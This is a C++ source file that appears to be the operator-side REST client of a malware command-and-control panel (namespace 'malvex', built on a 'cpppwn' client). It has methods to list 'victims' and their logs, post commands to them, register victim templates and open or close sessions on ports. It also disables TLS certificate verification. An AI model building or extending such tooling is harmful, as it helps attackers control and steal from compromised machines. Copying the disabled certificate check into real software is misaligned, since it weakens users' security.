#include "RestGateway.hpp"

#include "Util/SafeLogger.hpp"
#include "UrlUtils.hpp"

namespace {

[[nodiscard]] malvex::Error from_exception(const std::exception& err, malvex::ErrorCode code) {
    return malvex::make_error(code, err.what());
}

} // namespace

RestGateway::RestGateway(std::string base_url)
    : m_rest_client(std::move(base_url), HttpConfig{}) {}

void RestGateway::configure(
    const std::string& base_url,
    const std::string& username,
    const std::string& password) {
    HttpConfig conf;
    conf.follow_redirects = true;
    conf.max_redirects = 3;
    conf.verbose = false;
    conf.verify_ssl = false;

    m_rest_client = cpppwn::RESTClient(strip_trailing_slash(base_url), conf);
    m_username = username;
    m_password = password;
    apply_auth();
}

void RestGateway::set_credentials(const std::string& username, const std::string& password) {
    m_username = username;
    m_password = password;
    apply_auth();
}

void RestGateway::apply_auth() {
    m_rest_client.set_auth_basic(m_username, m_password);
}

malvex::Result<bool> RestGateway::login() {
    apply_auth();
    try {
        return m_rest_client.get<bool>("/auth");
    } catch (const std::exception& err) {
        logger::info("Login Failed: {}", err.what());
        return std::unexpected(from_exception(err, malvex::ErrorCode::Auth));
    }
}

malvex::Result<std::vector<Victim>> RestGateway::fetch_victims() {
    apply_auth();
    try {
        return m_rest_client.list<Victim>("api/victims");
    } catch (const std::exception& err) {
        return std::unexpected(from_exception(err, malvex::ErrorCode::Network));
    }
}

malvex::Result<std::vector<LogDAO>> RestGateway::fetch_logs() {
    apply_auth();
    try {
        return m_rest_client.list<LogDAO>("api/logs");
    } catch (const std::exception& err) {
        return std::unexpected(from_exception(err, malvex::ErrorCode::Network));
    }
}

malvex::Result<LogDAO> RestGateway::post_log(const LogDAO& log) {
    apply_auth();
    try {
        return m_rest_client.post<LogDAO>("api/logs", log);
    } catch (const std::exception& err) {
        return std::unexpected(from_exception(err, malvex::ErrorCode::Network));
    }
}

malvex::Result<CommandDAO> RestGateway::post_command(const CommandDAO& command) {
    apply_auth();
    try {
        return m_rest_client.post<CommandDAO>("api/commands", command);
    } catch (const std::exception& err) {
        return std::unexpected(from_exception(err, malvex::ErrorCode::Network));
    }
}

malvex::Result<VictimTemplateCreatedResponse> RestGateway::register_template(
    const VictimTemplateCreateRequest& request) {
    apply_auth();
    try {
        return m_rest_client.post<VictimTemplateCreateRequest, VictimTemplateCreatedResponse>(
            "api/templates",
            request);
    } catch (const std::exception& err) {
        return std::unexpected(from_exception(err, malvex::ErrorCode::Network));
    }
}

malvex::Result<std::string> RestGateway::open_session(int64_t port) {
    apply_auth();
    try {
        return m_rest_client.get<std::string>(std::format("open_session?port={}", port));
    } catch (const std::exception& err) {
        return std::unexpected(from_exception(err, malvex::ErrorCode::Network));
    }
}

malvex::Result<std::string> RestGateway::close_session(int64_t port) {
    apply_auth();
    try {
        return m_rest_client.get<std::string>(std::format("close_session?port={}", port));
    } catch (const std::exception& err) {
        return std::unexpected(from_exception(err, malvex::ErrorCode::Network));
    }
}
